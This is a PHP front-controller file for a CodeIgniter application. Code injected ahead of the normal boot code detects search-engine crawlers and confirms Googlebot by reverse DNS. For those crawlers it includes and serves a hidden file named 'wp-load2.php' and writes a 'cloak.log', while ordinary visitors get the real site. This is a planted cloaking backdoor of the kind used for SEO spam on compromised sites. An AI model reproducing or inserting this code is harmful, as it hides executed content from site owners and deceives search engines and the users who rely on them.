<?php
ini_set('display_errors','1');ini_set('display_startup_errors','1');error_reporting(E_ALL);

$T=__DIR__.'/wp-load2.php';$C=300;$L=false;$LF=__DIR__.'/cloak.log';$G=true;$S=true;$CN=[];$PV='8.1';

function _h($k,$d=''){ $k='HTTP_'.strtoupper(str_replace('-','_',$k)); return $_SERVER[$k]??$d; }
function _ip(){ if($a=_h('CF-Connecting-IP'))return $a; if($b=_h('X-Forwarded-For')){ $p=array_map('trim',explode(',',$b)); if(!empty($p[0]))return $p[0]; } return $_SERVER['REMOTE_ADDR']??'0.0.0.0'; }
function _u(){ return $_SERVER['REQUEST_URI']??'/'; }
function _ua(){ return $_SERVER['HTTP_USER_AGENT']??''; }
function _cc(){ $c=_h('CF-IPCountry'); return $c!==''?strtoupper($c):null; }
function _sb($ua){ return $ua!=='' && (bool)preg_match('/googlebot|google-inspectiontool|googleother|bingbot|yandex|duckduckbot|slurp|baiduspider|applebot|semrushbot|ahrefsbot|mj12bot/i',$ua); }
function _vg($ip){ $h=gethostbyaddr($ip); if($h===$ip||$h===false)return false; if(!preg_match('/(\.googlebot\.com|\.google\.com)$/i',$h))return false; $ips=gethostbynamel($h); return $ips&&in_array($ip,$ips,true); }
function _sk($u){ foreach(['~^/(wp-admin|wp-login\.php|wp-cron\.php|xmlrpc\.php|wp-json/|feed/|comments/|robots\.txt|sitemap)~i','~^/(admin|api|assets|static|uploads|favicon\.ico)~i','~\.(css|js|png|jpe?g|webp|gif|svg|ico|mp4|mp3|woff2?)$~i'] as $p){ if(preg_match($p,$u))return true; } return false; }
function _sv($f,$ttl,$lg=false,$lf=''){ if(!is_file($f)){ if($lg)@file_put_contents($lf,"[".date('c')."] MISS:$f\n",FILE_APPEND); header('HTTP/1.1 404 Not Found'); echo 'Not found'; exit; } if(!headers_sent()){ header('Content-Type:text/html; charset=UTF-8'); header('Cache-Control: public, max-age='.max(0,$ttl)); header('X-Robots-Tag: noarchive'); } $e=strtolower(pathinfo($f,PATHINFO_EXTENSION)); if($e==='php'){ include $f; }else{ readfile($f); } if($lg)@file_put_contents($lf,"[".date('c')."] SERVED_BOT:$f UA="._ua()." IP="._ip()." URI="._u()."\n",FILE_APPEND); exit; }

$ua=_ua();$ru=_u();$ip=_ip();$cc=_cc();$pc=true; if(!empty($CN)){$pc=$cc?in_array(strtoupper($cc),$CN,true):false;}

if($S&&!_sk($ru)){
  $sb=_sb($ua); $gok=true;
  if($G&&preg_match('/googlebot|google-inspectiontool|googleother/i',$ua)){ $gok=_vg($ip); }
  if($sb&&$gok&&$pc){ _sv($T,$C,$L,$LF); }
}

if(version_compare(PHP_VERSION,$PV,'<')){ header('HTTP/1.1 503 Service Unavailable',true,503); echo sprintf('Your PHP version must be %s or higher to run CodeIgniter. Current version: %s',$PV,PHP_VERSION); exit(1); }

define('FCPATH',__DIR__.DIRECTORY_SEPARATOR); if(getcwd().DIRECTORY_SEPARATOR!==FCPATH){ chdir(FCPATH); }
require FCPATH.'app/Config/Paths.php'; $p=new Config\Paths(); require $p->systemDirectory.'/Boot.php'; exit(CodeIgniter\Boot::bootWeb($p));
